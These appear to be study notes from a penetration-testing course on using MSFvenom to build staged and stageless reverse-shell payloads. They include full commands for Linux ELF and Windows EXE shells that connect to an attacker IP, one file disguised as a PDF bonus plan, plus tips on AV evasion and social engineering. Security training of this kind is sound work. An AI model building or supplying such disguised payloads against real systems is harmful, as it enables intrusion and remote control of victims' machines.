# Crafting Payloads with MSFvenom

## Overview

`MSFvenom` is a Metasploit tool used to:
- Generate payloads
- Create reverse shells
- Build malicious executables
- Encode payloads
- Bypass simple AV detection

It is commonly used when:
- Direct exploitation is not possible
- Payload delivery must happen manually
- Social engineering is required

# Naming Breakdown

| Part | Meaning |
|------|----------|
| `linux` | Target OS |
| `x64` | Architecture |
| `shell` | Shell payload |
| `reverse_tcp` | Reverse TCP connection |

# Staged vs Stageless Payloads

## Staged Payloads

A staged payload:
1. Sends a small initial payload
2. Connects back to attacker
3. Downloads the remaining payload

Example:

```text
windows/meterpreter/reverse_tcp
```

---

## Advantages

- Smaller initial payload
- Flexible delivery

---

## Disadvantages

- More network traffic
- Easier to detect
- May fail on unstable networks

---

# Stageless Payloads

A stageless payload:
- Contains the entire payload in one file
- Does not download additional stages

Example:

```text
windows/meterpreter_reverse_tcp
```

---

## Advantages

- More stable
- Less network traffic
- Better for evasion

---

## Important Observation

### Staged

```text
meterpreter/reverse_tcp
```

Multiple stages separated by `/`

### Stageless

```text
meterpreter_reverse_tcp
```

Single combined payload.

# Build Linux Reverse Shell Payload

## Main Command

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

---

# Command Breakdown

| Option | Purpose |
|--------|----------|
| `-p` | Select payload |
| `linux/x64/shell_reverse_tcp` | Linux reverse shell payload |
| `LHOST` | Attacker IP |
| `LPORT` | Listener port |
| `-f elf` | ELF executable format |
| `>` | Save payload to file |

# Build Windows Payload

## Main Command

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

---

# Important Format

```text
-f exe
```

Creates:
- Windows executable payload

---

# Executing Windows Payload

If AV is disabled:
- Victim executes `.exe`
- Reverse shell connects back to attacker

# Important Notes

- Windows Defender usually detects raw payloads
- Encoding may help bypass simple AV
- Payload names should look legitimate
- Reverse shells commonly use ports:
  - 80
  - 443

---

# Key Points

- MSFvenom creates custom payloads
- Supports Linux, Windows, macOS, and more
- Staged payloads download additional stages
- Stageless payloads contain everything in one payload
- Payload delivery often requires social engineering

---

# One-Line Revision

MSFvenom is used to generate staged or stageless payloads for different operating systems to establish reverse shells and deliver malicious code.
